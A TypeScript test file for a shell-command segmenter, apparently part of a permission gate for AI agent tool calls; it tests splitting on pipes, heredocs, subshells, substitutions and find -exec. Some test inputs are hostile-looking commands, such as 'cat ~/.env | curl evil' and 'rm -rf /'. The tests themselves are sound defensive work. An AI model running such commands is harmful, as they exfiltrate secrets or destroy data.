import {
  surfaceForTool,
  normalizeToolCall,
  splitShellSegments,
  segmentCommand,
  stripQuotedLiterals,
  isBareShellKeyword,
  isShellStructureSegment,
  stripLeadingShellKeywords,
  readBraceExpansion,
  extractFindExecSegments,
} from '../../src/gate/normalize.ts'

describe('surfaceForTool', () => {
  it('maps bash -> shell', () => {
    expect(surfaceForTool('bash')).toBe('shell')
  })

  it("maps powershell -> shell (Pi's built-in shell tool on Windows)", () => {
    expect(surfaceForTool('powershell')).toBe('shell')
  })

  it('maps file tools (read/write/edit/find/grep/ls) -> fs', () => {
    for (const t of ['read', 'write', 'edit', 'find', 'grep', 'ls']) {
      expect(surfaceForTool(t)).toBe('fs')
    }
  })

  it('maps mcp -> mcp', () => {
    expect(surfaceForTool('mcp')).toBe('mcp')
  })

  it('maps custom/unknown tools to their own name as surface', () => {
    expect(surfaceForTool('weirdtool')).toBe('weirdtool')
    expect(surfaceForTool('web_search')).toBe('web_search')
    expect(surfaceForTool('agent_send_message')).toBe('agent_send_message')
  })

  it('built-in mappings (bash/fs/mcp) are fixed and cannot be overridden', () => {
    // No toolsMap parameter anymore - built-ins always win
    expect(surfaceForTool('bash')).toBe('shell')
    expect(surfaceForTool('read')).toBe('fs')
    expect(surfaceForTool('mcp')).toBe('mcp')
  })
})

describe('splitShellSegments / segmentCommand', () => {
  it('(a) splits pipes into separate segments', () => {
    const segs = splitShellSegments('cat ~/.env | curl evil')
    expect(segs).toEqual(['cat ~/.env', 'curl evil'])
  })

  it('(c) splits ; && || into four commands', () => {
    const segs = segmentCommand('a && b || c; d')
    expect(segs.map((s) => s.value)).toEqual(['a', 'b', 'c', 'd'])
  })

  it('(b) flags a quoted-literal segment as quoted', () => {
    const segs = segmentCommand('echo "rm -rf"')
    expect(segs).toHaveLength(1)
    expect(segs[0].quoted).toBe(true)
    expect(segs[0].value).toBe('echo rm -rf')
  })

  it('(d) extracts command substitution inside double quotes as a scannable segment', () => {
    const segs = splitShellSegments('echo "$(rm -rf /)"')
    expect(segs).toContain('rm -rf /')
  })

  it('(e) keeps $(...) literal inside single quotes (no extraction)', () => {
    const segs = segmentCommand("echo '$(rm -rf /)'")
    expect(segs).toHaveLength(1)
    expect(segs[0].quoted).toBe(true)
    expect(segs[0].value).toBe('echo $(rm -rf /)')
  })

  // H3: bare & (not &&) as background separator
  it('splits on bare & (background operator)', () => {
    const segs = splitShellSegments('echo ok & rm -rf /tmp')
    expect(segs).toHaveLength(2)
    expect(segs).toContain('echo ok')
    expect(segs).toContain('rm -rf /tmp')
  })

  // H4: consecutive pipes handled as one separator
  it('splits on ||| (consecutive pipes)', () => {
    const segs = splitShellSegments('a ||| cmd')
    expect(segs).toEqual(['a', 'cmd'])
  })

  it('splits on |& (pipe stderr) as one separator', () => {
    const segs = splitShellSegments('a |& cmd')
    expect(segs).toEqual(['a', 'cmd'])
  })
})

describe('segmentCommand keepQuotes (raw twin for the scope extractor)', () => {
  it('default strips quotes; keepQuotes preserves them', () => {
    expect(segmentCommand('echo "rm -rf"')[0].value).toBe('echo rm -rf')
    expect(segmentCommand('echo "rm -rf"', { keepQuotes: true })[0].value).toBe(
      'echo "rm -rf"'
    )
  })

  it('quoted sed program stays whole in the raw twin', () => {
    const raw = segmentCommand('sed "s/^/L: /" x', { keepQuotes: true })
    expect(raw).toHaveLength(1)
    expect(raw[0].value).toBe('sed "s/^/L: /" x')
    expect(raw[0].quoted).toBe(true)
  })

  it('raw and dequoted parses zip 1:1 over tricky commands', () => {
    const cmds = [
      'for i in 1 2; do ./gradlew :app:x 2>&1 | rg "a|b" | sed "s/^/L: /"; done',
      'python3 -c "for p in xs: print(p)"',
      'echo "a $(cat /tmp/x) b" | grep "//"',
      "cat <<'EOF'\nhello\nEOF",
      'a && b || c; d & e |& f',
    ]
    for (const cmd of cmds) {
      const plain = segmentCommand(cmd)
      const raw = segmentCommand(cmd, { keepQuotes: true })
      expect(raw.map((s) => s.quoted)).toEqual(plain.map((s) => s.quoted))
      expect(raw).toHaveLength(plain.length)
    }
  })

  it('normalizeToolCall sets rawValue only when quotes are present', () => {
    const withQuotes = normalizeToolCall('bash', { command: 'echo "a b"' })
    expect(withQuotes).toHaveLength(1)
    expect(withQuotes[0].rawValue).toBe('echo "a b"')
    const bare = normalizeToolCall('bash', { command: 'ls src' })
    expect(bare).toHaveLength(1)
    expect(bare[0].rawValue).toBeUndefined()
  })
})

describe('normalizeToolCall edge cases', () => {
  // L10: bash without command does not produce "undefined"
  it("bash without command yields sentinel value '*' not 'undefined'", () => {
    const intents = normalizeToolCall('bash', {})
    expect(intents).toHaveLength(1)
    expect(intents[0].value).not.toBe('undefined')
    expect(intents[0].value).toBe('*')
  })
})

describe('heredoc handling', () => {
  it('attaches heredoc body to the consumer segment', () => {
    const cmd = `cat <<EOF
rm -rf /tmp
EOF
echo done`
    const segs = segmentCommand(cmd)
    expect(segs).toHaveLength(2)
    expect(segs[0].value).toBe(`cat <<EOF\nrm -rf /tmp\nEOF`)
    expect(segs[1].value).toBe('echo done')
  })

  it('keeps heredoc body within consumer command without creating standalone segment', () => {
    const cmd = `cat <<EOF
rm -rf /tmp
EOF`
    const segs = segmentCommand(cmd)
    expect(segs).toHaveLength(1)
    expect(segs[0].value).toBe(`cat <<EOF\nrm -rf /tmp\nEOF`)
    expect(segs[0].quoted).toBe(false)
  })
})

describe('normalizeToolCall surface mapping', () => {
  it("normalizes a bash command to surface 'shell' with the segment as value", () => {
    const intents = normalizeToolCall('bash', { command: 'ls -la' })
    expect(intents).toEqual([{ surface: 'shell', value: 'ls -la' }])
  })

  it("normalizes a file tool to surface 'fs'", () => {
    const intents = normalizeToolCall('read', { path: '/etc/passwd' })
    expect(intents).toEqual([{ surface: 'fs', value: '/etc/passwd' }])
  })

  it("normalizes an mcp tool to surface 'mcp'", () => {
    const intents = normalizeToolCall('mcp', { tool: 'search' })
    expect(intents).toEqual([{ surface: 'mcp', value: 'search' }])
  })

  it('multi-segment bash command yields one shell intent per segment', () => {
    const intents = normalizeToolCall('bash', {
      command: 'echo a; echo b',
    })
    expect(intents).toEqual([
      { surface: 'shell', value: 'echo a' },
      { surface: 'shell', value: 'echo b' },
    ])
  })

  it('normalizes a custom tool to its own name as surface', () => {
    const intents = normalizeToolCall('agent_send_message', {
      recipient: 'user',
      body: 'hi',
    })
    expect(intents).toHaveLength(1)
    expect(intents[0].surface).toBe('agent_send_message')
    expect(intents[0].value).toBe('*')
  })

  it('an unknown tool resolves to its own name as surface (not denied)', () => {
    const intents = normalizeToolCall('unknown_thing', { x: 1 })
    expect(intents).toEqual([{ surface: 'unknown_thing', value: '*' }])
  })
})

describe('redirections and compound command splitting', () => {
  const exampleCmd =
    'agy --help 2>&1 | head -n 200; echo "---EXIT:$?---"; which agy; agy models list 2>&1 | head -n 100 || agy model list 2>&1 | head -n 100'

  it('correctly splits compound command without treating "1" as a separate command', () => {
    const rawSegs = segmentCommand(exampleCmd, { keepQuotes: true }).map(
      (s) => s.value
    )
    expect(rawSegs).toEqual([
      'agy --help 2>&1',
      'head -n 200',
      'echo "---EXIT:$?---"',
      'which agy',
      'agy models list 2>&1',
      'head -n 100',
      'agy model list 2>&1',
      'head -n 100',
    ])
    expect(rawSegs).not.toContain('1')

    const segs = splitShellSegments(exampleCmd)
    expect(segs).toEqual([
      'agy --help 2>&1',
      'head -n 200',
      'echo ---EXIT:$?---',
      'which agy',
      'agy models list 2>&1',
      'head -n 100',
      'agy model list 2>&1',
      'head -n 100',
    ])
    expect(segs).not.toContain('1')
  })

  it('normalizes compound command into 8 intents with proper rawValue', () => {
    const intents = normalizeToolCall('bash', { command: exampleCmd })
    expect(intents).toHaveLength(8)
    expect(intents.map((i) => i.value)).not.toContain('1')
    expect(intents[0]).toEqual({
      surface: 'shell',
      value: 'agy --help 2>&1',
    })
    expect(intents[2]).toEqual({
      surface: 'shell',
      value: 'echo ---EXIT:$?---',
      rawValue: 'echo "---EXIT:$?---"',
    })
  })

  it('handles all redirection variants without splitting & as background operator', () => {
    expect(splitShellSegments('cmd 2>&1 | next')).toEqual(['cmd 2>&1', 'next'])
    expect(splitShellSegments('cmd >&2 | next')).toEqual(['cmd >&2', 'next'])
    expect(splitShellSegments('cmd &>file | next')).toEqual([
      'cmd &>file',
      'next',
    ])
    expect(splitShellSegments('cmd &>>file | next')).toEqual([
      'cmd &>>file',
      'next',
    ])
    expect(splitShellSegments('cmd <&0 | next')).toEqual(['cmd <&0', 'next'])
    expect(splitShellSegments('cmd >&- | next')).toEqual(['cmd >&-', 'next'])
    expect(splitShellSegments('cmd <&- | next')).toEqual(['cmd <&-', 'next'])
    expect(splitShellSegments('cmd 1>&2 | next')).toEqual(['cmd 1>&2', 'next'])
    expect(splitShellSegments('cmd 2>&- | next')).toEqual(['cmd 2>&-', 'next'])
    expect(splitShellSegments('cmd 0<&- | next')).toEqual(['cmd 0<&-', 'next'])
    expect(splitShellSegments('cmd &> file | next')).toEqual([
      'cmd &> file',
      'next',
    ])
    expect(splitShellSegments('cmd &>> file | next')).toEqual([
      'cmd &>> file',
      'next',
    ])
    expect(splitShellSegments('cmd >& file | next')).toEqual([
      'cmd >& file',
      'next',
    ])
    expect(splitShellSegments('cmd >&file | next')).toEqual([
      'cmd >&file',
      'next',
    ])
  })

  it('splits on background & following a redirection', () => {
    expect(splitShellSegments('cmd 2>&1 & next')).toEqual(['cmd 2>&1', 'next'])
    expect(splitShellSegments('cmd 2>&1& next')).toEqual(['cmd 2>&1', 'next'])
    expect(splitShellSegments('cmd &>out & next')).toEqual([
      'cmd &>out',
      'next',
    ])
  })

  it('preserves $? inside quotes and splits on || properly', () => {
    expect(splitShellSegments('echo "$?" || echo fallback')).toEqual([
      'echo $?',
      'echo fallback',
    ])
    expect(
      segmentCommand('echo "$?" || echo fallback', { keepQuotes: true }).map(
        (s) => s.value
      )
    ).toEqual(['echo "$?"', 'echo fallback'])
  })

  it('does not treat <<< herestring as heredoc', () => {
    const segs = splitShellSegments('cat <<< "hello"; echo done')
    expect(segs).toEqual(['cat <<< hello', 'echo done'])
  })

  it('handles user command with escaped quotes inside regex without splitting on regex pipes', () => {
    const cmd =
      'cd "C:/Users/lerg_/opencode-bypass-src" && rg -n "serve_url|/session|/event|/config/providers|prompt_async|opencode\\", \\"run\\"|\\"run\\",|--format|cwd=" opencode_proxy.py | head -n 25'

    const plainSegs = segmentCommand(cmd)
    expect(plainSegs).toHaveLength(3)
    expect(plainSegs[0].value).toBe('cd C:/Users/lerg_/opencode-bypass-src')
    expect(plainSegs[1].value).toBe(
      'rg -n serve_url|/session|/event|/config/providers|prompt_async|opencode", "run"|"run",|--format|cwd= opencode_proxy.py'
    )
    expect(plainSegs[2].value).toBe('head -n 25')

    const rawSegs = segmentCommand(cmd, { keepQuotes: true })
    expect(rawSegs).toHaveLength(3)
    expect(rawSegs[0].value).toBe('cd "C:/Users/lerg_/opencode-bypass-src"')
    expect(rawSegs[1].value).toBe(
      'rg -n "serve_url|/session|/event|/config/providers|prompt_async|opencode\\", \\"run\\"|\\"run\\",|--format|cwd=" opencode_proxy.py'
    )
    expect(rawSegs[2].value).toBe('head -n 25')

    // Ensure no segment is an isolated fragment like \"run\", or --format
    const allValues = plainSegs.map((s) => s.value)
    expect(allValues).not.toContain('\\"run\\",')
    expect(allValues).not.toContain('"run",')
    expect(allValues).not.toContain('--format')
    expect(allValues.some((v) => v.startsWith('"run",'))).toBe(false)
    expect(allValues.some((v) => v.startsWith('\\"run\\",'))).toBe(false)

    // Verify normalizeToolCall zips correctly with rawValue
    const intents = normalizeToolCall('bash', { command: cmd })
    expect(intents).toHaveLength(3)
    expect(intents[0].value).toBe('cd C:/Users/lerg_/opencode-bypass-src')
    expect(intents[0].rawValue).toBe('cd "C:/Users/lerg_/opencode-bypass-src"')
    expect(intents[1].value).toBe(
      'rg -n serve_url|/session|/event|/config/providers|prompt_async|opencode", "run"|"run",|--format|cwd= opencode_proxy.py'
    )
    expect(intents[1].rawValue).toBe(
      'rg -n "serve_url|/session|/event|/config/providers|prompt_async|opencode\\", \\"run\\"|\\"run\\",|--format|cwd=" opencode_proxy.py'
    )
    expect(intents[2].value).toBe('head -n 25')
    expect(intents[2].rawValue).toBeUndefined()
  })

  it('handles simpler escaped quote cases inside double quotes', () => {
    const simple = 'echo "hello \\"world\\" | foo"'
    const plain = segmentCommand(simple)
    expect(plain).toHaveLength(1)
    expect(plain[0].value).toBe('echo hello "world" | foo')
    expect(plain[0].quoted).toBe(true)

    const raw = segmentCommand(simple, { keepQuotes: true })
    expect(raw).toHaveLength(1)
    expect(raw[0].value).toBe('echo "hello \\"world\\" | foo"')
    expect(raw[0].quoted).toBe(true)
  })

  it('handles escaped characters outside quotes without opening quotes or splitting pipes', () => {
    const escapedPipe = 'echo hello\\|world'
    expect(splitShellSegments(escapedPipe)).toEqual(['echo hello\\|world'])

    const escapedQuote = 'echo \\"hello\\"'
    const segs = segmentCommand(escapedQuote)
    expect(segs).toHaveLength(1)
    expect(segs[0].value).toBe('echo \\"hello\\"')
    expect(segs[0].quoted).toBe(false)
  })

  it('handles stripQuotedLiterals with escaped quotes inside and outside quotes', () => {
    expect(stripQuotedLiterals('echo "hello \\"world\\""')).toBe(
      'echo hello "world"'
    )
    expect(
      stripQuotedLiterals(
        'rg -n "serve_url|opencode\\", \\"run\\"|--format" file'
      )
    ).toBe('rg -n serve_url|opencode", "run"|--format file')
    expect(stripQuotedLiterals('echo \\"hello\\"')).toBe('echo \\"hello\\"')
  })
})

describe('compound loop/subshell command segmentation', () => {
  const loopCmd = `for f in /tmp/agy1.txt /tmp/agy2.txt /tmp/agy3.txt; do
  echo "=== $f ($(wc -l < $f 2>/dev/null || echo 0) lines) ==="
  tail -n 55 "$f" 2>/dev/null
done
rm -f /tmp/agy1.txt /tmp/agy2.txt /tmp/agy3.txt`

  it('correctly segments compound loop with nested command substitutions and cleanup', () => {
    const plain = segmentCommand(loopCmd)
    const values = plain.map((s) => s.value)

    expect(values).toEqual([
      'for f in /tmp/agy1.txt /tmp/agy2.txt /tmp/agy3.txt',
      'echo === $f ($(wc -l < $f 2>/dev/null || echo 0) lines) ===',
      'wc -l < $f 2>/dev/null',
      'echo 0',
      'tail -n 55 $f 2>/dev/null',
      'rm -f /tmp/agy1.txt /tmp/agy2.txt /tmp/agy3.txt',
    ])

    expect(values).not.toContain('do')
    expect(values).not.toContain('done')
    expect(values).not.toContain('lines) ===')
    expect(values).not.toContain('echo === $f (')
  })

  it('verifies raw and plain 1:1 parity on compound loop command', () => {
    const plain = segmentCommand(loopCmd)
    const raw = segmentCommand(loopCmd, { keepQuotes: true })

    expect(raw).toHaveLength(plain.length)
    expect(raw.map((s) => s.quoted)).toEqual(plain.map((s) => s.quoted))
    expect(raw.map((s) => s.value)).toEqual([
      'for f in /tmp/agy1.txt /tmp/agy2.txt /tmp/agy3.txt',
      'echo "=== $f ($(wc -l < $f 2>/dev/null || echo 0) lines) ==="',
      'wc -l < $f 2>/dev/null',
      'echo 0',
      'tail -n 55 "$f" 2>/dev/null',
      'rm -f /tmp/agy1.txt /tmp/agy2.txt /tmp/agy3.txt',
    ])
  })
})

describe('subshells and brace groups (Item 2)', () => {
  it('splits subshell into inner command segments', () => {
    const segs = segmentCommand('(cd /tmp && npm test)')
    expect(segs.map((s) => s.value)).toEqual(['cd /tmp', 'npm test'])
  })

  it('handles subshell with single command', () => {
    const segs = segmentCommand('(npm test)')
    expect(segs.map((s) => s.value)).toEqual(['npm test'])
  })

  it('handles nested subshells', () => {
    const segs = segmentCommand('(cd /tmp && (cd /var && npm test))')
    expect(segs.map((s) => s.value)).toEqual(['cd /tmp', 'cd /var', 'npm test'])
  })

  it('splits brace group into segments and drops bare closing brace', () => {
    const segs = segmentCommand('{ echo a; echo b; }')
    expect(segs.map((s) => s.value)).toEqual(['echo a', 'echo b'])
  })

  it('handles brace group without trailing semicolon before closing brace', () => {
    const segs = segmentCommand('{ echo a; echo b }')
    expect(segs.map((s) => s.value)).toEqual(['echo a', 'echo b'])
  })

  it('recognizes bare braces and parens as keywords', () => {
    expect(isBareShellKeyword('(')).toBe(true)
    expect(isBareShellKeyword(')')).toBe(true)
    expect(isBareShellKeyword('{')).toBe(true)
    expect(isBareShellKeyword('}')).toBe(true)
  })

  it('preserves balanced parens in normal commands', () => {
    expect(stripLeadingShellKeywords('echo (foo)')).toBe('echo (foo)')
    expect(stripLeadingShellKeywords('echo $(cat file)')).toBe(
      'echo $(cat file)'
    )
  })

  it('strips extra unbalanced closing parens', () => {
    expect(stripLeadingShellKeywords('npm test)')).toBe('npm test')
    expect(stripLeadingShellKeywords('echo (foo))')).toBe('echo (foo)')
  })

  it('preserves 1:1 parity between plain and raw for subshells and brace groups', () => {
    const cmd1 = '(cd /tmp && npm test "suite a")'
    const plain1 = segmentCommand(cmd1)
    const raw1 = segmentCommand(cmd1, { keepQuotes: true })
    expect(raw1).toHaveLength(plain1.length)
    expect(raw1.map((s) => s.quoted)).toEqual(plain1.map((s) => s.quoted))
    expect(plain1.map((s) => s.value)).toEqual(['cd /tmp', 'npm test suite a'])
    expect(raw1.map((s) => s.value)).toEqual(['cd /tmp', 'npm test "suite a"'])

    const cmd2 = '{ echo "a"; echo \'b\'; }'
    const plain2 = segmentCommand(cmd2)
    const raw2 = segmentCommand(cmd2, { keepQuotes: true })
    expect(raw2).toHaveLength(plain2.length)
    expect(raw2.map((s) => s.quoted)).toEqual(plain2.map((s) => s.quoted))
    expect(plain2.map((s) => s.value)).toEqual(['echo a', 'echo b'])
    expect(raw2.map((s) => s.value)).toEqual(['echo "a"', "echo 'b'"])
  })
})

describe('line continuations (Item 3)', () => {
  it('collapses line continuations with LF into a single segment', () => {
    const segs = segmentCommand('echo hello \\\n  world')
    expect(segs).toHaveLength(1)
    expect(segs[0].value).toBe('echo hello world')
  })

  it('collapses line continuations with CRLF into a single segment', () => {
    const segs = segmentCommand('echo hello \\\r\n  world')
    expect(segs).toHaveLength(1)
    expect(segs[0].value).toBe('echo hello world')
  })

  it('collapses multiple line continuations', () => {
    const segs = segmentCommand('echo hello \\\n  beautiful \\\n  world')
    expect(segs).toHaveLength(1)
    expect(segs[0].value).toBe('echo hello beautiful world')
  })

  it('removes line continuations completely inside double quotes', () => {
    const segs = segmentCommand('"echo hello \\\nworld"')
    expect(segs).toHaveLength(1)
    expect(segs[0].value).toBe('echo hello world')
    const raw = segmentCommand('"echo hello \\\nworld"', { keepQuotes: true })
    expect(raw[0].value).toBe('"echo hello world"')
  })

  it('preserves backslash as literal inside single quotes', () => {
    const segs = segmentCommand("'echo hello \\\nworld'")
    expect(segs).toHaveLength(1)
    expect(segs[0].value).toBe('echo hello \\\nworld')
  })

  it('preserves 1:1 parity between plain and raw for line continuations', () => {
    const cmd = 'echo "hello\\\nworld" && echo \\\n  next'
    const plain = segmentCommand(cmd)
    const raw = segmentCommand(cmd, { keepQuotes: true })
    expect(raw).toHaveLength(plain.length)
    expect(raw.map((s) => s.quoted)).toEqual(plain.map((s) => s.quoted))
    expect(plain.map((s) => s.value)).toEqual(['echo helloworld', 'echo next'])
    expect(raw.map((s) => s.value)).toEqual(['echo "helloworld"', 'echo next'])
  })
})

describe('keywords with redirections (Item 4)', () => {
  it('drops done 2>/dev/null as bare shell keyword', () => {
    expect(isBareShellKeyword('done 2>/dev/null')).toBe(true)
    expect(isShellStructureSegment('done 2>/dev/null')).toBe(true)
    const segs = segmentCommand('for i in 1; do echo $i; done 2>/dev/null')
    expect(segs.map((s) => s.value)).toEqual(['for i in 1', 'echo $i'])
    expect(segs.map((s) => s.value)).not.toContain('done 2>/dev/null')
  })

  it('drops fi >/dev/null 2>&1 as bare shell keyword', () => {
    expect(isBareShellKeyword('fi >/dev/null 2>&1')).toBe(true)
    expect(isShellStructureSegment('fi >/dev/null 2>&1')).toBe(true)
  })

  it('keeps done > /tmp/out.txt for external directory inspection but marks as structure segment', () => {
    expect(isBareShellKeyword('done > /tmp/out.txt')).toBe(false)
    expect(isShellStructureSegment('done > /tmp/out.txt')).toBe(true)

    const segs = segmentCommand('for i in 1; do echo $i; done > /tmp/out.txt')
    const values = segs.map((s) => s.value)
    expect(values).toContain('done > /tmp/out.txt')
    expect(values).toEqual(['for i in 1', 'echo $i', 'done > /tmp/out.txt'])
  })

  it('preserves 1:1 parity between plain and raw for keywords with redirections', () => {
    const cmd = 'for i in 1; do echo "$i"; done > /tmp/out.txt'
    const plain = segmentCommand(cmd)
    const raw = segmentCommand(cmd, { keepQuotes: true })
    expect(raw).toHaveLength(plain.length)
    expect(raw.map((s) => s.quoted)).toEqual(plain.map((s) => s.quoted))
    expect(plain.map((s) => s.value)).toEqual([
      'for i in 1',
      'echo $i',
      'done > /tmp/out.txt',
    ])
    expect(raw.map((s) => s.value)).toEqual([
      'for i in 1',
      'echo "$i"',
      'done > /tmp/out.txt',
    ])
  })
})

describe('parameter expansion and [[ ... ]] conditional blocks (Item 5)', () => {
  it('does not split [[ -f a.txt && -f b.txt ]] on internal operators', () => {
    const segs = segmentCommand('[[ -f a.txt && -f b.txt ]] && echo ok')
    expect(segs.map((s) => s.value)).toEqual([
      '[[ -f a.txt && -f b.txt ]]',
      'echo ok',
    ])
  })

  it('does not split [[ ... ]] on internal pipe or ||', () => {
    const segs = segmentCommand('[[ -f a || -f b ]] | cat')
    expect(segs.map((s) => s.value)).toEqual(['[[ -f a || -f b ]]', 'cat'])
  })

  it('extracts command substitution from within [[ ... ]]', () => {
    const segs = segmentCommand('[[ -f a.txt && $(echo ok) == ok ]]')
    expect(segs.map((s) => s.value)).toEqual([
      '[[ -f a.txt && $(echo ok) == ok ]]',
      'echo ok',
    ])
  })

  it('keeps parameter expansion with pipe intact as single segment', () => {
    const segs = segmentCommand('echo "${FOO:-a|b}"')
    expect(segs).toHaveLength(1)
    expect(segs[0].value).toBe('echo ${FOO:-a|b}')
  })

  it('keeps parameter expansion with inner quotes intact without closing outer quote prematurely', () => {
    const segs = segmentCommand('echo "${FOO:-"a|b"}"')
    expect(segs).toHaveLength(1)
    expect(segs[0].value).toBe('echo ${FOO:-a|b}')
    const raw = segmentCommand('echo "${FOO:-"a|b"}"', { keepQuotes: true })
    expect(raw).toHaveLength(1)
    expect(raw[0].value).toBe('echo "${FOO:-"a|b"}"')
  })

  it('extracts command substitution from parameter expansion', () => {
    const segs = segmentCommand('echo "${FOO:-$(cat /tmp/secret)}"')
    expect(segs.map((s) => s.value)).toEqual([
      'echo ${FOO:-$(cat /tmp/secret)}',
      'cat /tmp/secret',
    ])
  })

  it('preserves 1:1 parity between plain and raw for parameter expansions and [[ ... ]]', () => {
    const cmd = '[[ -f a.txt && -f "b.txt" ]] && echo "${FOO:-x|y}"'
    const plain = segmentCommand(cmd)
    const raw = segmentCommand(cmd, { keepQuotes: true })
    expect(raw).toHaveLength(plain.length)
    expect(raw.map((s) => s.quoted)).toEqual(plain.map((s) => s.quoted))
    expect(plain.map((s) => s.value)).toEqual([
      '[[ -f a.txt && -f b.txt ]]',
      'echo ${FOO:-x|y}',
    ])
    expect(raw.map((s) => s.value)).toEqual([
      '[[ -f a.txt && -f "b.txt" ]]',
      'echo "${FOO:-x|y}"',
    ])
  })
})

describe('process substitution (Item 6)', () => {
  it('extracts command segments from <(...) and >(...)', () => {
    const cmd = 'diff <(sort a.txt | uniq) <(sort b.txt)'
    const segs = segmentCommand(cmd)
    expect(segs.map((s) => s.value)).toEqual([
      'diff <(sort a.txt | uniq) <(sort b.txt)',
      'sort a.txt',
      'uniq',
      'sort b.txt',
    ])
  })

  it('extracts command segments from output process substitution >(...)', () => {
    const cmd = 'tee >(gzip > out.gz)'
    const segs = segmentCommand(cmd)
    expect(segs.map((s) => s.value)).toEqual([
      'tee >(gzip > out.gz)',
      'gzip > out.gz',
    ])
  })

  it('preserves 1:1 parity between plain and raw for process substitutions', () => {
    const cmd = 'diff <(sort "a.txt" | uniq) <(sort "b.txt")'
    const plain = segmentCommand(cmd)
    const raw = segmentCommand(cmd, { keepQuotes: true })
    expect(raw).toHaveLength(plain.length)
    expect(raw.map((s) => s.quoted)).toEqual(plain.map((s) => s.quoted))
    expect(plain.map((s) => s.value)).toEqual([
      'diff <(sort a.txt | uniq) <(sort b.txt)',
      'sort a.txt',
      'uniq',
      'sort b.txt',
    ])
    expect(raw.map((s) => s.value)).toEqual([
      'diff <(sort "a.txt" | uniq) <(sort "b.txt")',
      'sort "a.txt"',
      'uniq',
      'sort "b.txt"',
    ])
  })
})

describe('find -exec / -execdir / -ok / -okdir (Item 7)', () => {
  it('emits find command and extracted -exec command segment terminated by \\;', () => {
    const cmd = 'find . -name "*.log" -exec rm -f {} \\;'
    const segs = segmentCommand(cmd)
    expect(segs.map((s) => s.value)).toEqual([
      'find . -name *.log -exec rm -f {} \\;',
      'rm -f {}',
    ])
  })

  it('emits find command and extracted -exec command segment terminated by +', () => {
    const cmd = 'find . -name "*.log" -exec rm -f {} +'
    const segs = segmentCommand(cmd)
    expect(segs.map((s) => s.value)).toEqual([
      'find . -name *.log -exec rm -f {} +',
      'rm -f {}',
    ])
  })

  it('handles -execdir and -ok variants', () => {
    const cmd = 'find /tmp -type f -execdir git status \\;'
    const segs = segmentCommand(cmd)
    expect(segs.map((s) => s.value)).toEqual([
      'find /tmp -type f -execdir git status \\;',
      'git status',
    ])
  })

  it('handles multiple -exec clauses in one find command', () => {
    const cmd = 'find . -exec echo {} \\; -exec rm {} \\;'
    const segs = segmentCommand(cmd)
    expect(segs.map((s) => s.value)).toEqual([
      'find . -exec echo {} \\; -exec rm {} \\;',
      'echo {}',
      'rm {}',
    ])
  })

  it('preserves 1:1 parity between plain and raw for find -exec', () => {
    const cmd = 'find . -name "*.log" -exec rm -f "bad file" {} \\;'
    const plain = segmentCommand(cmd)
    const raw = segmentCommand(cmd, { keepQuotes: true })
    expect(raw).toHaveLength(plain.length)
    expect(raw.map((s) => s.quoted)).toEqual(plain.map((s) => s.quoted))
    expect(plain.map((s) => s.value)).toEqual([
      'find . -name *.log -exec rm -f bad file {} \\;',
      'rm -f bad file {}',
    ])
    expect(raw.map((s) => s.value)).toEqual([
      'find . -name "*.log" -exec rm -f "bad file" {} \\;',
      'rm -f "bad file" {}',
    ])
  })
})
